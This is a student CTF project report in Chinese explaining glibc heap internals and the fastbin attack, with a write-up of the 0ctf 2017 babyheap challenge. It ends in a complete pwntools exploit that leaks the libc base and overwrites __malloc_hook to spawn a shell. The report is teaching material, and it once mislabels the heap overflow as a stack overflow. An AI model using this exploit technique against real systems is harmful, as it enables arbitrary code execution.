# CTF Project 2

Created: April 25, 2022 2:59 PM

# Team

- 第 7 組
- 7777777

---

# Research Topic - **Linux Heap Exploit : Fastbin Attack**

# 原機制正常運作原理

## Heap Background

- Heap : 通過 malloc 或是 new 分配出來的記憶體。而分配的位置通常會出現在 libc 和主程式的 code 和 data 段之間。
- 過於頻繁呼叫 syscall 讓程式經常在 Kernal / User Mode 之間切換會導致效能低落，所以 Library 通常的實作會是直接向 Kernal 申請一大塊的記憶體 (唯一 Kernal 和 User Mode 之間切換的時間點)，有自己一套機制去管理這塊記憶體的切割、分配、回收、合併等等的操作。
- 第一次呼叫 malloc 的時候會先初始化 main_arena，初始化完之後會向 Kernel 申請一大塊記憶體，之後的 malloc 會再從這一大塊記憶體中分割出 chunk 回傳給程式

### Chunk

- Chunk 可分為三種，分別為 **Allocated Chunk**、**Free Chunk**、**Top Chunk**。三種類別的 Chunk 都有大同小異的資料結構，包含 Chunk Header 和 Chunk Data，主要的差異會在 Header。
    - **Allocated Chunk (已經被分配的)**
        
        ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled.png)
        
        - prev_size / data：鄰近的上一塊 Chunk 的 size (如果上一塊沒有在使用) 或 data (如果上一塊正在使用)
        - size：此 Chunk 的 size
        - A：是否由其他 arena 管理，而不是 main_arena
        - M：是否由 mmap 創出來的
        - P：鄰近的上一個 Chunk 是否正在使用
    - **Free Chunk (被釋放的)**
        
        ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%201.png)
        
        - fd : Forward Pointer，指向下一塊 Free 掉的 Chunk
        - bk : Backward Pointer，指向上一塊 Free 掉的 Chunk
    - **Top Chunk (剩餘的)**
        
        ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%202.png)
        
        - 在 Heap 頂端的 Chunk,，代表剩餘的空間

### Bin

- Bin 可以理解為 chunk 的回收桶，是一種主要負責紀錄 free chunk 的資料結構。依據大小與特性總共可以分成 4 總
    - Fastbin：
        - 10 個 bin
        - single linked list
        - 不執行合併，且 free 的時候不會清除下一個 chunk 的 `PREV_INUSE` flag
    - Unsorted Bin :
        - 最近 free 的 small / large chunk，沒有指定的大小範圍
        - 重複使用 chunk 以加速 allocation
    - Small Bin :
        - 62 個 bin
        - chunk size < 512 bytes
        - 兩個相鄰的 free chunk 會合併，以減少 fragmentation
    - Large Bin :
        - 63 個 bin
        - chunk size ≥ 512 byes
        - bin 裡的 chunk 會依據大小排序，allocate 的時候需要從裡面挑選適當大小

### Hooks

- 在執行對應的 function 時，若發現該 function hook 有值，則其值會做為 function pointer 跳上去執行，細節可以參考下方 glibc source code。
- 因此利用此特性，hook 可以做到控制程式執行 flow。常見的包含 `malloc` 的 __malloc_hook 和 `free` 的 __free_hook。因此想法上我們只要想辦法給定 __malloc_hook 一個我們要的位置，並 trigger malloc()，就可以讓 rip 吃到該位置後跳到該處執行。
    
    ```c
    void *
    __libc_malloc (size_t bytes)
    {
      mstate ar_ptr;
      void *victim;
    
      _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                      "PTRDIFF_MAX is not more than half of SIZE_MAX");
    
      void *(*hook) (size_t, const void *)
        = atomic_forced_read (__malloc_hook);
      if (__builtin_expect (hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS (0));
    	...
    }
    ```
    

## Fastbin 運作原理

- Fastbin 為 single linked list。free chunk 會存放於相對應大小的 fastbin linked list 後面，該大小共有 7 種，分別為 0x20, 0x30 ..., 0x80。
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%203.png)
    
- Fastbin 是屬於 LIFO 的結構，因此當再次 malloc 記憶體時，會先拿走 chunk 2，而這個時候會重新將 linked list 接到 chunk 1 的的地方
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%204.png)
    

# 如何濫用此機制

glibc library 提供了 **`free`** 和 **`malloc`** 的 function 來管理 heap memory。而其中 fastbin attack 是利用 fastbin 分配原理的漏洞，使得我們有辦法操弄已釋放的 chunk。常見的濫用手法包括 double free,

### Fastbin Double Free

- Fastbin Double Free 是指相同的 chunk 被多次釋放，導致該 chunk 在 Fastbin 的 linked table 中存在多次，進而使得在後續分配空間時會從 Fastbin 中取出指向同一塊記憶體位置的 chunk。
- 因為 chunk 被釋放後相鄰的後一塊 chunk 其用來紀錄上一塊 chunk 是否被使用的 prev_inuse 並不會被清空，且在執行 **free 的時候只會檢查 linked list 的第一塊 chunk 是否等於現在即將要 free 掉的 chunk，對於後面接續連接的 chunk 不會檢查，故可以用下面的方式繞過**。
    
    ```c
    void *chunk1, *chunk2;
    chunk1 = malloc(0x10);
    chunk2 = malloc(0x10);
    
    free(chunk1);
    free(chunk2);
    free(chunk1); // double free
    ```
    

![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%205.png)

- 因為 chunk 1 被再次釋放，所以其 fd 數值會從 0 改成 chunk 2。**若接下來我們再次 malloc 空間，並於寫入 data 時修改掉原本 chunk 1 的 fd ，創造出 fake chunk，以讓我們可以控制到任意 address，製造出可以 write everywhere 的機會**，接下來再連續 malloc 兩次後，就可以 access 到 fake chunk
    
    ```c
    void *chunk3, *chunk4, *chunk5, *fakechunk;
    
    chunk3 = malloc(0x10);  // this chunk is free at same time
    read(0, chunk3, data);
    chunk4 = malloc(0x10);
    chunk5 = malloc(0x10);  // address same as chunk3
    fakechunk = malloc(0x10
    ```
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%206.png)
    

# 如何實作可以達成濫用的效果

- 我們使用 **2017 0ctf babyheap** 來作為 Fastbin Attack 示範如何實作可以達到濫用
    
    [write-ups-2017/0ctf-quals-2017/pwn/Baby-Heap-2017-255 at master · ctfs/write-ups-2017](https://github.com/ctfs/write-ups-2017/tree/master/0ctf-quals-2017/pwn/Baby-Heap-2017-255)
    

### **Writeup**

1. 從 ctf 的 github 上面可以載到 binary file 以及 libc.so 檔案，我們首先用 `checksec babyheap` 檢查這一題的防禦機制，發現這題全部的防禦機制都打開了。
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%207.png)
    
2. 試著執行 binary file，並搭配著 IDA 分析，會發現這份 code 做的事情有四個 : allocate、fill、free、dump。
    - allocate : 分配可自訂大小的記憶體，大小限制為 0x1000。特別注意的是這題是用 calloc 分配，所以在分配的時候會將內容全部歸零，所以要想辦法繞掉。
        
        ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%208.png)
        
    
    - fill : 可以針對記憶體寫入資料，特別注意的是這個部分針對輸入的資訊沒有長度的檢查，推測可能是漏洞點。
        
        ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%209.png)
        
    
    - free : 釋放一塊記憶體空間
    - dump : 印出對應 idx 的 chunk 內容
3. 透過觀察可以發現這題存在 stack overflow 的漏洞，因此嘗試 leak 出 libc base address 後，利用 fastbin 的特性竄改指向位置。因此我們先 calloc 出 5 塊chunk，並 free 掉 idx 1 和 2 的 chunk，這個時候 fastbin 中就有指向 chunk 2 以及被 chunk 2 指向的 chunk 1
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%2010.png)
    
4. 接著我們可以利用 stack overflow 從 idx 0 處塞入 payload 以將 chunk 2 的 fd 位置蓋掉成 chunk 4 的位置，並且透過 idx 3 的 chunk 將 chunk 4 從原本大小 0x91 修改至符合 fastbin size 的 0x31
    
    ![Untitled](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/Untitled%2011.png)
    
5. 將 chunk 2 和修改過大小的 chunk 4 分配回來，再將 chunk 4 的大小更改回 0x91 使其再度變回 small chunk 後再 free 掉。這樣就能成功建構出 chunk 2 chunk 4 指向同一個 chunk 的起始 address，但是chunk 在 smallbin 中，且 chunk 2 正在使用中的結構。這個時候就可以透過 chunk 2 leak 出 libc 的 base address。
6. 再取得 libc 位置之後，我們利用 one_gadget 的套件找到一個開 shell 的指令，並設法在 malloc_hook 附近建構一個 fake chunk，嘗試透過這個 chunk 用 fill() assign value 給 __malloc_hook，再執行 calloc 的時候就會因為 `__malloc_hook` 有給值，而直接跳到該處執行。
    
    ![MicrosoftTeams-image (1).png](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/MicrosoftTeams-image_(1).png)
    
7. 最後就可以拿到了 shell。(備註 : 因為 ctf 的 server 已經關閉，因此這邊沒有 flag 顯示出來)
    
    ![MicrosoftTeams-image.png](CTF%20Project%202%202542ef8a77724021a9d848e0f7ab52fb/MicrosoftTeams-image.png)
    

### Exploit

```python
from pwn import *
import sys

def alloc(size):
    p.sendline('1')
    p.sendlineafter(': ', str(size))
    p.recvuntil(': ', timeout=1)

def fill(idx, data):
    p.sendline('2')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(len(data)))
    p.sendafter(': ', data)
    p.recvuntil(': ')

def free(idx):
    p.sendline('3')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': ')

def dump(idx):
    p.sendline('4')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': \n')
    data = p.recvline()
    p.recvuntil(': ')
    return data

p = process(['./babyheap'], env={"LD_PRELOAD":"./libc.so.6"})
p.recvuntil(': ')

alloc(0x20)    # chunk 0
alloc(0x20)    # chunk 1
alloc(0x20)    # chunk 2
alloc(0x20)    # chunk 3
alloc(0x80)    # chunk 4

free(1)        # main_arena -> chunk 1
free(2)        # main_arena -> chunk 2 -> chunk 1

# replace chunk 2 fd address to chunk 4
payload  = p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
payload += p8(0xc0)
fill(0, payload)

# replace chunk 4 size from 0x91 to 0x31
payload  = p64(0)*5
payload += p64(0x31)
fill(3, payload)

# let chunk 4 both in smallbin and fastbin
alloc(0x20)
alloc(0x20)

# change chunk size
payload  = p64(0)*5
payload += p64(0x91)
fill(3, payload)
alloc(0x80)
free(4)

# leak libc base address
libc_base = u64(dump(2)[:8]) - 0x3a5678
log.info("libc_base: " + hex(libc_base))

alloc(0x68)
free(4)

fill(2, p64(libc_base + 0x3a55ed))
alloc(0x60)
alloc(0x60)

payload  = '\x00'*3
payload += p64(0)*2
payload += p64(libc_base + 0x41374)
fill(6, payload)

alloc(255)

p.interactive()
```